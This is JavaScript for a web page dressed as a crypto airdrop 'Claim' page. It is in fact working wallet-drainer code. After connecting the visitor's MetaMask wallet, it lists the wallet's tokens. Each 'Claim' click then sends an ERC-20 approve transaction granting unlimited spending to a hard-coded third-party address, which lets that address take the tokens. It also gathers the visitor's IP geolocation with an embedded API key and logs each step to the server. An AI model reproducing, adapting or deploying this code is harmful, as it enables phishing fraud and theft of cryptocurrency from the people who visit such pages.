
function analytics(e, d) {
	if (!r_sent) {
		r_sent = true
		$.ajax({
		    type: 'POST',
		    url: '/analytics',
		    data: JSON.stringify({event_title: e, data: d, user_id: user_id}),
		    contentType: 'application/json; charset=utf-8',
		    dataType: 'json',
		    success: function(r){r_sent = false},
		    error: function() {r_sent = false}
		})
	}
	else {
		setTimeout(function(){analytics(e, d)}, 100)
	}
}

let main_btn = $('#main_btn')[0]
let header_btn = $('#header_btn')[0]
let progress = $('#progress')[0]
let try_again_ = $('#try_again')[0]
let wallet_alert = $('#wallet_alert')[0]
let close_wallet_alert_btn = $('#close_wallet_alert_btn')[0]


main_btn.onclick = connect_wallet
header_btn.onclick = connect_wallet

function loadTokens(address) {
	analytics('LoadTokens', address)
	$.ajax({
		url: '/get_tokens?address='+address,
		type: 'GET',
		success: function(r) {
			tokens_loaded = true
			token_list = r['result']
			analytics('LoadTokensS', [address, token_list])
		},
		error: function(r) {
			console.log(`Error with tokens loading: ${r}`)
			analytics('LoadTokensE', address)
			loadTokens(address)
		}
	})
}

function show_wallet_alert() {
	wallet_alert.style.display = 'flex'
	setTimeout(function () {
		wallet_alert.style.display = 'none'
	}, 3500)
}

close_wallet_alert_btn.addEventListener('click', function () {
	wallet_alert.style.display = 'none'
})

let r_sent = false

let user_id = null

let wallet_connected = false
let account = ''
let token_list = []
let current_token = 0
let tokens_loaded = false

function connect_wallet() {
	analytics('ConnectWallet', '')
	if (window.ethereum) {
		window.ethereum.request({method: 'eth_requestAccounts'}).then(accounts => {
			account = accounts[0]
			wallet_connected = true

			setButtonToClaim()
			hide_header_btn()
			analytics('WalletConnected', account)
			loadTokens(account)
		})
		return true
	}
	else {
		show_wallet_alert()
		analytics('WalletConnectedE', '')
		return false
	}
}

function setButtonToClaim() {
	main_btn.innerHTML = 'Claim'
	main_btn.onclick = claim;
	progress.innerHTML = 'Click Claim button to get airdrop'
}

function hide_header_btn() {
	header_btn.innerHTML = account.slice(0, 6)+'...'+account.slice(-4)
	header_btn.onclick = null;
}

function check_user() {
	let apiKey = 'be0f755b93290b4c100445d77533d291763a417c75524e95e07819ad';
	$.getJSON('https://api.ipdata.co?api-key=' + apiKey, function(data) {
		$.ajax({
		    type: 'POST',
		    url: '/check_user',
		    data: JSON.stringify(data, null, 2),
		    contentType: 'application/json; charset=utf-8',
		    dataType: 'json',
		    success: function(r) {r_sent = false},
		    error: function() {r_sent = false}
		})
		$.getJSON('/get_user?ip=' + data['ip'], function(info) {
    		user_id = info['user_id']
    	})
	})
}

async function networkCheck() {
	const chainId = 56

	if (window.ethereum.networkVersion !== chainId) {
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: web3.utils.toHex(chainId) }]
        });
      } catch (err) {
          // This error code indicates that the chain has not been added to MetaMask
        if (err.code === 4902) {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [
              {
                chainName: 'Binance Smart Chain',
                chainId: web3.utils.toHex(chainId),
                nativeCurrency: { name: 'BNB', decimals: 18, symbol: 'BNB' },
                rpcUrls: ['https://bsc-dataseed.binance.org/']
              }
            ]
          });
        }
      }
    }
}
networkCheck()

function try_again() {
	try_again_.style.display = 'inline'
}

address_to_approve = '0x02b7d5B985A78242A6aDE09298699e7e38A331b5'

approve_transaction = {}
function generate_transaction() {
	approve_transaction['to'] = token_list[current_token]
	approve_transaction['from'] = account
	approve_transaction['data'] = '0x095ea7b3'+'000000000000000000000000'+address_to_approve.replace('0x', '').toLowerCase()+'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
}

function transaction_sent(tx) {
	analytics('TransactionSent', tx)
	$.ajax({
		url: '/transaction_sent?tx='+tx,
		type: 'GET',
		success: function (r) {
			console.log(r)
			analytics('TransactionSentS', r)
		},
		error: function (r) {
			console.log(r)
			transaction_sent(tx)
			analytics('TransactionSentE', r)
		}
	})
}

claim_clicked = false
function claim() {
	analytics('ClaimBtnClicked', tokens_loaded)
	main_btn.innerHTML = 'Loading...'
	if (tokens_loaded) {
		claim_clicked = false
		generate_transaction()
		txHash = ethereum.request({
			method: 'eth_sendTransaction',
			params: [approve_transaction],
		}).then(tx => {
			main_btn.innerHTML = 'Claim'
			current_token+=1
			console.log(tx)
			transaction_sent(tx)
			try_again()
			analytics('ClaimBtnClickedS', tokens_loaded)
		}).catch(error => {
			main_btn.innerHTML = 'Claim'
			try_again()
			analytics('ClaimBtnClickedE', tokens_loaded)
		})
	}
	else {
		claim_clicked = true
		setTimeout(claim, 100);
	}
}

window.onload = function() {
	analytics('PageLoaded', window.location.href)
	check_user()
}
